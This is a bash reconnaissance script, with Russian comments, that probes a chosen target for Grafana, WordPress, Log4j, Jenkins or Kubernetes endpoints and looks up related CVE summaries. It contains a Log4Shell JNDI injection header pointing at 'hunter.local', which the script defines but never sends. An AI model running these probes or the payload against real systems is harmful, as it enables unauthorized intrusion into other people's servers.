#!/bin/bash
# Argus Hunter Mode — точечная охота на технологию
TECH="$1"
TARGET="${2:-http://localhost}"

[ -z "$TECH" ] && echo "Usage: $0 <tech> <url>" && echo "Examples:" && echo "  $0 grafana http://target.com" && echo "  $0 wordpress http://target.com" && echo "  $0 log4j http://target.com" && exit 1

echo "[HUNTER] 🎯 Цель: $TECH на $TARGET"
OUT="$HOME/argus_hunt_${TECH}_$(date +%H%M).txt"

# База знаний
case "$TECH" in
    grafana)
        PATHS="/grafana /grafana/login /grafana/api/dashboards"
        SIGS="grafana_login|grafana_detect|CVE-2021-43798"
        CVES="CVE-2021-43798 CVE-2022-26148 CVE-2023-3128 CVE-2024-1442"
        ;;
    wordpress|wp)
        PATHS="/wp-admin /wp-login.php /wp-json/wp/v2/users"
        SIGS="WordPress|wp-content|wp-includes|CVE-2024-"
        CVES="CVE-2024-4439 CVE-2024-5947 CVE-2024-28000"
        ;;
    log4j|log4shell)
        PATHS="/"
        SIGS="log4j|Log4j|JndiLookup"
        CVES="CVE-2021-44228 CVE-2021-45046 CVE-2021-45105"
        HEADERS='-H "X-Api-Version: \${jndi:ldap://hunter.local/a}"'
        ;;
    jenkins)
        PATHS="/jenkins /jenkins/login /jenkins/script"
        SIGS="Jenkins|jenkins|CVE-2024-"
        CVES="CVE-2024-23897 CVE-2024-22201 CVE-2024-22257"
        ;;
    kubernetes|k8s)
        PATHS="/api/v1/pods /api/v1/namespaces /version"
        SIGS="kubernetes|kube-system|CVE-2023-"
        CVES="CVE-2023-5528 CVE-2023-3676 CVE-2024-7646"
        ;;
    *)
        echo "[HUNTER] Неизвестная технология. Ищу через CVE API..."
        PATHS="/"
        SIGS="$TECH"
        CVES=$(curl -s "https://cve.circl.lu/api/search/$TECH" 2>/dev/null | python3 -c "import sys,json; [print(c['id']) for c in json.load(sys.stdin)['data'][:5]]" 2>/dev/null | tr '\n' ' ')
        ;;
esac

echo "[HUNTER] Путей: $(echo $PATHS | wc -w) | CVE: $(echo $CVES | wc -w)" | tee "$OUT"

# Фаза 1: Обнаружение
echo "[HUNTER] Фаза 1: Обнаружение $TECH..." | tee -a "$OUT"
for path in $PATHS; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "$TARGET$path" 2>/dev/null)
    [ "$code" != "000" ] && [ "$code" != "404" ] && echo "  ✅ $path [HTTP $code]" | tee -a "$OUT"
done

# Фаза 2: Проверка CVE
echo "[HUNTER] Фаза 2: Проверка CVE..." | tee -a "$OUT"
for cve in $CVES; do
    [ -z "$cve" ] && continue
    echo "  🔍 $cve..." | tee -a "$OUT"
    curl -s "https://cve.circl.lu/api/cve/$cve" 2>/dev/null | python3 -c "
import sys,json
try:
    d = json.load(sys.stdin)
    print(f\"    📝 {d.get('summary','')[:150]}\")
    cvss = d.get('cvss', 'N/A')
    print(f\"    ⚡ CVSS: {cvss}\")
except: pass
" 2>/dev/null | tee -a "$OUT"
done

echo "[HUNTER] ✅ Готово! Отчёт: $OUT"
